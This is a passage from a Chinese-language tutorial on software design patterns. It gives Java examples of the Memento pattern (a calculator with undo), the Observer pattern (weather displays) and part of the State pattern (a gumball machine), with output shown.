<p>以下实现了一个简单计算器程序，可以输入两个值，然后计算这两个值的和。备忘录模式允许将这两个值存储起来，然后在某个时刻用存储的状态进行恢复。</p>
<p>实现参考：<a href="https://www.oodesign.com/memento-pattern-calculator-example-java-sourcecode.html" target="_blank" rel="noopener noreferrer">Memento Pattern - Calculator Example - Java Sourcecode</a></p>
<div><pre><code><span>/**
 * Originator Interface
 */</span>
<span>public</span> <span>interface</span> <span>Calculator</span> <span>{</span>

    <span>// Create Memento</span>
    <span>PreviousCalculationToCareTaker</span> <span>backupLastCalculation</span><span>(</span><span>)</span><span>;</span>

    <span>// setMemento</span>
    <span>void</span> <span>restorePreviousCalculation</span><span>(</span><span>PreviousCalculationToCareTaker</span> memento<span>)</span><span>;</span>

    <span>int</span> <span>getCalculationResult</span><span>(</span><span>)</span><span>;</span>

    <span>void</span> <span>setFirstNumber</span><span>(</span><span>int</span> firstNumber<span>)</span><span>;</span>

    <span>void</span> <span>setSecondNumber</span><span>(</span><span>int</span> secondNumber<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><div><pre><code><span>/**
 * Originator Implementation
 */</span>
<span>public</span> <span>class</span> <span>CalculatorImp</span> <span>implements</span> <span>Calculator</span> <span>{</span>

    <span>private</span> <span>int</span> firstNumber<span>;</span>
    <span>private</span> <span>int</span> secondNumber<span>;</span>

    <span>@Override</span>
    <span>public</span> <span>PreviousCalculationToCareTaker</span> <span>backupLastCalculation</span><span>(</span><span>)</span> <span>{</span>
        <span>// create a memento object used for restoring two numbers</span>
        <span>return</span> <span>new</span> <span>PreviousCalculationImp</span><span>(</span>firstNumber<span>,</span> secondNumber<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>restorePreviousCalculation</span><span>(</span><span>PreviousCalculationToCareTaker</span> memento<span>)</span> <span>{</span>
        <span>this</span><span>.</span>firstNumber <span>=</span> <span>(</span><span>(</span><span>PreviousCalculationToOriginator</span><span>)</span> memento<span>)</span><span>.</span><span>getFirstNumber</span><span>(</span><span>)</span><span>;</span>
        <span>this</span><span>.</span>secondNumber <span>=</span> <span>(</span><span>(</span><span>PreviousCalculationToOriginator</span><span>)</span> memento<span>)</span><span>.</span><span>getSecondNumber</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>int</span> <span>getCalculationResult</span><span>(</span><span>)</span> <span>{</span>
        <span>// result is adding two numbers</span>
        <span>return</span> firstNumber <span>+</span> secondNumber<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>setFirstNumber</span><span>(</span><span>int</span> firstNumber<span>)</span> <span>{</span>
        <span>this</span><span>.</span>firstNumber <span>=</span> firstNumber<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>setSecondNumber</span><span>(</span><span>int</span> secondNumber<span>)</span> <span>{</span>
        <span>this</span><span>.</span>secondNumber <span>=</span> secondNumber<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></div></div><div><pre><code><span>/**
 * Memento Interface to Originator
 *
 * This interface allows the originator to restore its state
 */</span>
<span>public</span> <span>interface</span> <span>PreviousCalculationToOriginator</span> <span>{</span>
    <span>int</span> <span>getFirstNumber</span><span>(</span><span>)</span><span>;</span>
    <span>int</span> <span>getSecondNumber</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>/**
 *  Memento interface to CalculatorOperator (Caretaker)
 */</span>
<span>public</span> <span>interface</span> <span>PreviousCalculationToCareTaker</span> <span>{</span>
    <span>// no operations permitted for the caretaker</span>
<span>}</span>
</code></pre></div><div><pre><code><span>/**
 * Memento Object Implementation
 * <span><span><span>&lt;</span>p</span><span>></span></span>
 * Note that this object implements both interfaces to Originator and CareTaker
 */</span>
<span>public</span> <span>class</span> <span>PreviousCalculationImp</span> <span>implements</span> <span>PreviousCalculationToCareTaker</span><span>,</span>
        <span>PreviousCalculationToOriginator</span> <span>{</span>

    <span>private</span> <span>int</span> firstNumber<span>;</span>
    <span>private</span> <span>int</span> secondNumber<span>;</span>

    <span>public</span> <span>PreviousCalculationImp</span><span>(</span><span>int</span> firstNumber<span>,</span> <span>int</span> secondNumber<span>)</span> <span>{</span>
        <span>this</span><span>.</span>firstNumber <span>=</span> firstNumber<span>;</span>
        <span>this</span><span>.</span>secondNumber <span>=</span> secondNumber<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>int</span> <span>getFirstNumber</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> firstNumber<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>int</span> <span>getSecondNumber</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> secondNumber<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div><div><pre><code><span>/**
 * CareTaker object
 */</span>
<span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>// program starts</span>
        <span>Calculator</span> calculator <span>=</span> <span>new</span> <span>CalculatorImp</span><span>(</span><span>)</span><span>;</span>

        <span>// assume user enters two numbers</span>
        calculator<span>.</span><span>setFirstNumber</span><span>(</span><span>10</span><span>)</span><span>;</span>
        calculator<span>.</span><span>setSecondNumber</span><span>(</span><span>100</span><span>)</span><span>;</span>

        <span>// find result</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>calculator<span>.</span><span>getCalculationResult</span><span>(</span><span>)</span><span>)</span><span>;</span>

        <span>// Store result of this calculation in case of error</span>
        <span>PreviousCalculationToCareTaker</span> memento <span>=</span> calculator<span>.</span><span>backupLastCalculation</span><span>(</span><span>)</span><span>;</span>

        <span>// user enters a number</span>
        calculator<span>.</span><span>setFirstNumber</span><span>(</span><span>17</span><span>)</span><span>;</span>

        <span>// user enters a wrong second number and calculates result</span>
        calculator<span>.</span><span>setSecondNumber</span><span>(</span><span>-</span><span>290</span><span>)</span><span>;</span>

        <span>// calculate result</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>calculator<span>.</span><span>getCalculationResult</span><span>(</span><span>)</span><span>)</span><span>;</span>

        <span>// user hits CTRL + Z to undo last operation and see last result</span>
        calculator<span>.</span><span>restorePreviousCalculation</span><span>(</span>memento<span>)</span><span>;</span>

        <span>// result restored</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>calculator<span>.</span><span>getCalculationResult</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br></div></div><div><pre><code>110
-273
110
</code></pre></div><h3 id="jdk-10" tabindex="-1"> JDK</h3>
<ul>
<li>java.io.Serializable</li>
</ul>
<h2 id="_7-观察者-observer" tabindex="-1"> 7. 观察者（Observer）</h2>
<h3 id="intent-12" tabindex="-1"> Intent</h3>
<p>定义对象之间的一对多依赖，当一个对象状态改变时，它的所有依赖都会收到通知并且自动更新状态。</p>
<p>主题（Subject）是被观察的对象，而其所有依赖者（Observer）称为观察者。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a3c6a30-c735-4edb-8115-337288a4f0f2.jpg" width="600"/> </div><br>
<h3 id="class-diagram-12" tabindex="-1"> Class Diagram</h3>
<p>主题（Subject）具有注册和移除观察者、并通知所有观察者的功能，主题是通过维护一张观察者列表来实现这些操作的。</p>
<p>观察者（Observer）的注册功能需要调用主题的 registerObserver() 方法。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a8c8f894-a712-447c-9906-5caef6a016e3.png"/> </div><br>
<h3 id="implementation-12" tabindex="-1"> Implementation</h3>
<p>天气数据布告板会在天气信息发生改变时更新其内容，布告板有多个，并且在将来会继续增加。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b1df9732-86ce-4d69-9f06-fba1db7b3b5a.jpg"/> </div><br>
<div><pre><code><span>public</span> <span>interface</span> <span>Subject</span> <span>{</span>
    <span>void</span> <span>registerObserver</span><span>(</span><span>Observer</span> o<span>)</span><span>;</span>

    <span>void</span> <span>removeObserver</span><span>(</span><span>Observer</span> o<span>)</span><span>;</span>

    <span>void</span> <span>notifyObserver</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>WeatherData</span> <span>implements</span> <span>Subject</span> <span>{</span>
    <span>private</span> <span>List</span><span><span>&lt;</span><span>Observer</span><span>></span></span> observers<span>;</span>
    <span>private</span> <span>float</span> temperature<span>;</span>
    <span>private</span> <span>float</span> humidity<span>;</span>
    <span>private</span> <span>float</span> pressure<span>;</span>

    <span>public</span> <span>WeatherData</span><span>(</span><span>)</span> <span>{</span>
        observers <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setMeasurements</span><span>(</span><span>float</span> temperature<span>,</span> <span>float</span> humidity<span>,</span> <span>float</span> pressure<span>)</span> <span>{</span>
        <span>this</span><span>.</span>temperature <span>=</span> temperature<span>;</span>
        <span>this</span><span>.</span>humidity <span>=</span> humidity<span>;</span>
        <span>this</span><span>.</span>pressure <span>=</span> pressure<span>;</span>
        <span>notifyObserver</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>registerObserver</span><span>(</span><span>Observer</span> o<span>)</span> <span>{</span>
        observers<span>.</span><span>add</span><span>(</span>o<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>removeObserver</span><span>(</span><span>Observer</span> o<span>)</span> <span>{</span>
        <span>int</span> i <span>=</span> observers<span>.</span><span>indexOf</span><span>(</span>o<span>)</span><span>;</span>
        <span>if</span> <span>(</span>i <span>>=</span> <span>0</span><span>)</span> <span>{</span>
            observers<span>.</span><span>remove</span><span>(</span>i<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>notifyObserver</span><span>(</span><span>)</span> <span>{</span>
        <span>for</span> <span>(</span><span>Observer</span> o <span>:</span> observers<span>)</span> <span>{</span>
            o<span>.</span><span>update</span><span>(</span>temperature<span>,</span> humidity<span>,</span> pressure<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br></div></div><div><pre><code><span>public</span> <span>interface</span> <span>Observer</span> <span>{</span>
    <span>void</span> <span>update</span><span>(</span><span>float</span> temp<span>,</span> <span>float</span> humidity<span>,</span> <span>float</span> pressure<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>StatisticsDisplay</span> <span>implements</span> <span>Observer</span> <span>{</span>

    <span>public</span> <span>StatisticsDisplay</span><span>(</span><span>Subject</span> weatherData<span>)</span> <span>{</span>
        weatherData<span>.</span><span>reisterObserver</span><span>(</span><span>this</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>update</span><span>(</span><span>float</span> temp<span>,</span> <span>float</span> humidity<span>,</span> <span>float</span> pressure<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"StatisticsDisplay.update: "</span> <span>+</span> temp <span>+</span> <span>" "</span> <span>+</span> humidity <span>+</span> <span>" "</span> <span>+</span> pressure<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>CurrentConditionsDisplay</span> <span>implements</span> <span>Observer</span> <span>{</span>

    <span>public</span> <span>CurrentConditionsDisplay</span><span>(</span><span>Subject</span> weatherData<span>)</span> <span>{</span>
        weatherData<span>.</span><span>registerObserver</span><span>(</span><span>this</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>update</span><span>(</span><span>float</span> temp<span>,</span> <span>float</span> humidity<span>,</span> <span>float</span> pressure<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"CurrentConditionsDisplay.update: "</span> <span>+</span> temp <span>+</span> <span>" "</span> <span>+</span> humidity <span>+</span> <span>" "</span> <span>+</span> pressure<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>WeatherStation</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>WeatherData</span> weatherData <span>=</span> <span>new</span> <span>WeatherData</span><span>(</span><span>)</span><span>;</span>
        <span>CurrentConditionsDisplay</span> currentConditionsDisplay <span>=</span> <span>new</span> <span>CurrentConditionsDisplay</span><span>(</span>weatherData<span>)</span><span>;</span>
        <span>StatisticsDisplay</span> statisticsDisplay <span>=</span> <span>new</span> <span>StatisticsDisplay</span><span>(</span>weatherData<span>)</span><span>;</span>

        weatherData<span>.</span><span>setMeasurements</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>)</span><span>;</span>
        weatherData<span>.</span><span>setMeasurements</span><span>(</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code>CurrentConditionsDisplay.update: 0.0 0.0 0.0
StatisticsDisplay.update: 0.0 0.0 0.0
CurrentConditionsDisplay.update: 1.0 1.0 1.0
StatisticsDisplay.update: 1.0 1.0 1.0
</code></pre></div><h3 id="jdk-11" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Observer.html" target="_blank" rel="noopener noreferrer">java.util.Observer</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/EventListener.html" target="_blank" rel="noopener noreferrer">java.util.EventListener</a></li>
<li><a href="http://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpSessionBindingListener.html" target="_blank" rel="noopener noreferrer">javax.servlet.http.HttpSessionBindingListener</a></li>
<li><a href="https://github.com/ReactiveX/RxJava" target="_blank" rel="noopener noreferrer">RxJava</a></li>
</ul>
<h2 id="_8-状态-state" tabindex="-1"> 8. 状态（State）</h2>
<h3 id="intent-13" tabindex="-1"> Intent</h3>
<p>允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它所属的类。</p>
<h3 id="class-diagram-13" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/79df886f-fdc3-4020-a07f-c991bb58e0d8.png"/> </div><br>
<h3 id="implementation-13" tabindex="-1"> Implementation</h3>
<p>糖果销售机有多种状态，每种状态下销售机有不同的行为，状态可以发生转移，使得销售机的行为也发生改变。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/396be981-3f2c-4fd9-8101-dbf9c841504b.jpg" width="600"/> </div><br>
<div><pre><code><span>public</span> <span>interface</span> <span>State</span> <span>{</span>
    <span>/**
     * 投入 25 分钱
     */</span>
    <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span><span>;</span>

    <span>/**
     * 退回 25 分钱
     */</span>
    <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span><span>;</span>

    <span>/**
     * 转动曲柄
     */</span>
    <span>void</span> <span>turnCrank</span><span>(</span><span>)</span><span>;</span>

    <span>/**
     * 发放糖果
     */</span>
    <span>void</span> <span>dispense</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>HasQuarterState</span> <span>implements</span> <span>State</span> <span>{</span>

    <span>private</span> <span>GumballMachine</span> gumballMachine<span>;</span>

    <span>public</span> <span>HasQuarterState</span><span>(</span><span>GumballMachine</span> gumballMachine<span>)</span> <span>{</span>
        <span>this</span><span>.</span>gumballMachine <span>=</span> gumballMachine<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You can't insert another quarter"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Quarter returned"</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getNoQuarterState</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You turned..."</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getSoldState</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>dispense</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"No gumball dispensed"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>NoQuarterState</span> <span>implements</span> <span>State</span> <span>{</span>

    <span>GumballMachine</span> gumballMachine<span>;</span>

    <span>public</span> <span>NoQuarterState</span><span>(</span><span>GumballMachine</span> gumballMachine<span>)</span> <span>{</span>
        <span>this</span><span>.</span>gumballMachine <span>=</span> gumballMachine<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You insert a quarter"</span><span>)</span><span>;</span>
        gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getHasQuarterState</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You haven't insert a quarter"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You turned, but there's no quarter"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>dispense</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You need to pay first"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>SoldOutState</span> <span>implements</span> <span>State</span> <span>{</span>

    <span>GumballMachine</span> gumballMachine<span>;</span>

    <span>public</span> <span>SoldOutState</span><span>(</span><span>GumballMachine</span> gumballMachine<span>)</span> <span>{</span>
        <span>this</span><span>.</span>gumballMachine <span>=</span> gumballMachine<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You can't insert a quarter, the machine is sold out"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You can't eject, you haven't inserted a quarter yet"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"You turned, but there are no gumballs"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>dispense</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"No gumball dispensed"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>SoldState</span> <span>implements</span> <span>State</span> <span>{</span>

    <span>GumballMachine</span> gumballMachine<span>;</span>

    <span>public</span> <span>SoldState</span><span>(</span><span>GumballMachine</span> gumballMachine<span>)</span> <span>{</span>
        <span>this</span><span>.</span>gumballMachine <span>=</span> gumballMachine<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Please wait, we're already giving you a gumball"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Sorry, you already turned the crank"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>turnCrank</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Turning twice doesn't get you another gumball!"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>dispense</span><span>(</span><span>)</span> <span>{</span>
        gumballMachine<span>.</span><span>releaseBall</span><span>(</span><span>)</span><span>;</span>
        <span>if</span> <span>(</span>gumballMachine<span>.</span><span>getCount</span><span>(</span><span>)</span> <span>></span> <span>0</span><span>)</span> <span>{</span>
            gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getNoQuarterState</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Oops, out of gumballs"</span><span>)</span><span>;</span>
            gumballMachine<span>.</span><span>setState</span><span>(</span>gumballMachine<span>.</span><span>getSoldOutState</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>GumballMachine</span> <span>{</span>

    <span>private</span> <span>State</span> soldOutState<span>;</span>
    <span>private</span> <span>State</span> noQuarterState<span>;</span>
    <span>private</span> <span>State</span> hasQuarterState<span>;</span>
    <span>private</span> <span>State</span> soldState<span>;</span>

    <span>private</span> <span>State</span> state<span>;</span>
    <span>private</span> <span>int</span> count <span>=</span> <span>0</span><span>;</span>

    <span>public</span> <span>GumballMachine</span><span>(</span><span>int</span> numberGumballs<span>)</span> <span>{</span>
        count <span>=</span> numberGumballs<span>;</span>
        soldOutState <span>=</span> <span>new</span> <span>SoldOutState</span><span>(</span><span>this</span><span>)</span><span>;</span>
        noQuarterState <span>=</span> <span>new</span> <span>NoQuarterState</span><span>(</span><span>this</span><span>)</span><span>;</span>
        hasQuarterState <span>=</span> <span>new</span> <span>HasQuarterState</span><span>(</span><span>this</span><span>)</span><span>;</span>
        soldState <span>=</span> <span>new</span> <span>SoldState</span><span>(</span><span>this</span><span>)</span><span>;</span>

        <span>if</span> <span>(</span>numberGumballs <span>></span> <span>0</span><span>)</span> <span>{</span>
            state <span>=</span> noQuarterState<span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            state <span>=</span> soldOutState<span>;</span>
        <span>}</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>insertQuarter</span><span>(</span><span>)</span> <span>{</span>
        state<span>.</span><span>insertQuarter</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>ejectQuarter</span><span>(</span><span>)</span> <span>{</span>
